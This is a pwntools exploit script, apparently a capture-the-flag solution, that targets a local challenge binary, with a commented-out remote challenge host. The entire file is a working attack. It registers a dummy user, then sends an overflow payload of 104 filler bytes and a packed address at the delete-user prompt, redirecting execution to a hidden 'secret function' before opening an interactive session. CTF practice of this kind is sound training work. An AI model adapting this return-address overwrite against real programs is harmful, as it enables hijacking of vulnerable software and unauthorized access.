#!/usr/bin/env python3
from pwn import *

# env setting
context(arch = 'amd64', os = 'linux')
#context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'DEBUG'

def connect():
    if not True:
        return remote('chals1.ais3.org', port=10003)
    else:
        return process('./ms')

def main():
    p = connect()

    secret_function_address = 0x000000000040131b
    
    # payload 1 (add user)
    p.sendlineafter(b'> ', '1')
    p.sendlineafter(b'Enter username (max 31 characters):', b'a')
    p.sendlineafter(b'Enter user account (max 15 characters):', b'a')
    p.sendlineafter(b'Enter user password (max 15 characters):', b'a')
    
    #gdb.attach(p)
    
    # payload 2 (crack gets)
    p.sendlineafter(b'> ', '3')
    p.sendlineafter(b'Enter the index of the user you want to delete:', b'a'*8*13+p64(secret_function_address))

    p.interactive()

if __name__=='__main__':
    main()
